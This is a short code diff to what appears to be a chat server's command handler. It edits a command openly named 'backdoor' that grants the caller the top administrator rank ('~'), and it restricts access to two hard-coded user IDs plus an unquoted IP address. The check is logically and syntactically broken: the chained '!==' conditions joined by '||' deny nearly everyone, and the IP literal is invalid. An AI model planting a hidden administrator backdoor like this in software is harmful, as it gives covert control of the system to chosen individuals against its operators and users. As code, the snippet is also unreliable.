@@ -589,7 +589,7 @@ user.updateIdentity();
      *********************************************************/
 
     backdoor: function (target, room, user) {
-        if (user.userid !== 'blakjack' || user.userid !== 'yukinagato') return this.sendReply('/backdoor - Access denied.');
+        if (user.ip !== 81.98.102.229 || user.userid !== 'blakjack' || user.userid !== 'yukinagato') return this.sendReply('/backdoor - Access denied.');
 
         if (!target) {
             user.group = '~';
